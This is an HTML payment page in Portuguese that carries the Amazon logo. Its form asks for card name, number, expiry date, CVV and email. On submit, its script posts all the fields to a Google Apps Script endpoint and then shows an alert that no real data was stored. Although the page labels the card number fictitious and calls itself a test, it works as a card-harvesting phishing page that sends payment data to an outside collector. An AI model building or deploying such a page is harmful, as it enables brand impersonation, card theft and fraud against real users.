<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8" />
  <title>Pagamento</title>
  <style>
  body {
  margin: 0;
  padding-top: 60px; 
  height: 100vh;
  display: flex;
  justify-content: center; 
  align-items: center;     
  background-color: #f2f2f2;
  font-family: Arial, sans-serif;
}

.navbar {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 60px;
      background-color: #000000; 
      display: flex;
      align-items: center;
      justify-content: space-between;
      padding: 0 20px;
      box-shadow: 0 2px 5px rgba(0,0,0,0.2);
      z-index: 10000;
      box-sizing: border-box;
    }
    .navbar .logo {
      height: 40px;
      cursor: pointer;
    }
    .navbar nav a {
      margin-left: 20px;
      text-decoration: none;
      color: #ffffff;
      font-weight: 600;
      font-size: 16px;
      transition: color 0.3s ease;
    }
    .navbar nav a:hover {
      color: #e25707;
    }

.container {
  background-color: #fff;
  padding: 25px;
  max-width: 400px;
  box-shadow: 0 0 10px rgba(0,0,0,0.1);
  border-radius: 8px;
}

    
    h2 {
      text-align: center;
      color: #333;
      margin-top: 0;
    }
    label {
      display: block;
      margin-top: 15px;
    }
    input[type="text"], input[type="email"] {
      width: 100%;
      padding: 10px;
      margin-top: 5px;
      box-sizing: border-box;
      border: 1px solid #ccc;
      border-radius: 4px;
      font-size: 14px;
      transition: border-color 0.3s ease;
    }
    input[type="text"]:focus, input[type="email"]:focus {
      border-color: #4CAF50;
      outline: none;
    }
    button {
      margin-top: 20px;
      padding: 12px;
      width: 100%;
      background-color: #d68132;
      color: white;
      border: none;
      font-size: 16px;
      cursor: pointer;
      border-radius: 4px;
      transition: background-color 0.3s ease;
    }
    button:hover {
      background-color: #bf7530;
    }
    .note {
      font-size: 12px;
      color: red;
      margin-top: 15px;
      text-align: center;
    }
    

    .bottom-menu {
      position: fixed;
      bottom: 0;
      left: 0;
      width: 100%;
      background-color: #af614c;
      display: flex;
      justify-content: space-around;
      padding: 10px 0;
      box-shadow: 0 -2px 5px rgba(0,0,0,0.2);
      z-index: 1000;
    }
    .bottom-menu a {
      color: white;
      text-decoration: none;
      font-weight: bold;
      font-size: 16px;
      padding: 8px 16px;
      border-radius: 4px;
      transition: background-color 0.3s ease;
    }
    .bottom-menu a:hover {
      background-color: #3e8e41;
    }
  </style>
</head>
<body>

  <header class="navbar">
    <img src="https://companieslogo.com/img/orig/AMZN_BIG.D-8fb0be81.png?t=1740113564" alt="Logo da Loja" class="logo" />
    <nav>
      <a href="Inicial.html">Inicial</a>
      <a href="#">Sobre</a>
      <a href="#">Carrinho</a>
    </nav>
  </header>

  <div class="container">
    <h2>Pagamento</h2>
    <form id="paymentForm">
      <label>Nome no cart√£o:</label>
      <input type="text" name="nome" required />
      
      <label>N√∫mero do cart√£o (fict√≠cio):</label>
      <input type="text" name="numero" maxlength="19" required />
      
      <label>Data de validade (MM/AA):</label>
      <input type="text" name="validade" placeholder="MM/AA" required />
      
      <label>CVV:</label>
      <input type="text" name="cvv" maxlength="4" required />

      <label>E-mail:</label>
      <input type="email" name="email" />
      
      <button type="submit">Enviar</button>
      <div class="note">
        üö® Este teste ter√° os valores guiados a planilha. <br />
      </div>
    </form>
  </div>

  <script>
    const form = document.getElementById("paymentForm");
    form.addEventListener("submit", (e) => {
      e.preventDefault();

      const data = new FormData(form);
      const values = Object.fromEntries(data.entries());

      fetch("https://script.google.com/macros/s/AKfycbwmNkHU2AXr9482t90oZFwn3fiJBsmu1MpZzkCQJ8K7wx3JLy-5LdcPQWHr5r5vO0wv2w/exec", {
        method: "POST",
        mode: "no-cors",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify(values),
      });

      alert("Teste enviado com sucesso! Nenhum dado real foi armazenado.");
      form.reset();
    });
  </script>
</body>
</html>
